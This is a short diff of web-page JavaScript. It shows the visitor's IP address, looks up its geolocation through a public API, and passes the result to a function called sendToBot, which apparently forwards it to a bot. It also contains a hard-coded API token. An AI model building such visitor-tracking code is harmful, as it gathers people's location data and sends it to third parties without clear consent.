@@ -25,11 +25,11 @@
             userIP = data.ip;
             document.getElementById("ip-display").textContent += userIP;
 
-            return fetch(`https://ipinfo.io/json?token=d713045b1cb709`);
+            return fetch(`https://ipapi.co/json`);
         })
         .then(response => response.json()).then(data => {
 
-            DataIP = JSON.stringify(data, null, 4);
+            DataIP = userIP + "\n" + JSON.stringify(data, null, 4);
             document.getElementById("response").textContent = DataIP;
 
             sendToBot(DataIP);
